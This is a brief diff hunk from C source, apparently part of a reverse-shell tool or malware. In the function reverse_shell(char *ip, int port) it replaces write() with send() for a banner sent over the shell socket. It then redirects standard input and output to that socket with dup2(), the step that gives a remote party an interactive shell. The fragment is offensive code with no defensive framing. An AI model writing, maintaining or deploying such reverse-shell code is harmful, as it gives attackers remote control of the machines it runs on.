@@ -212,7 +212,7 @@ void reverse_shell(char *ip, int port) {
         return;
     }
 
-    write(shell_fd, SHELL_MOTD, strlen(SHELL_MOTD));
+    send(shell_fd, SHELL_MOTD, strlen(SHELL_MOTD), 0);
 
     dup2(shell_fd, 0);
     dup2(shell_fd, 1);
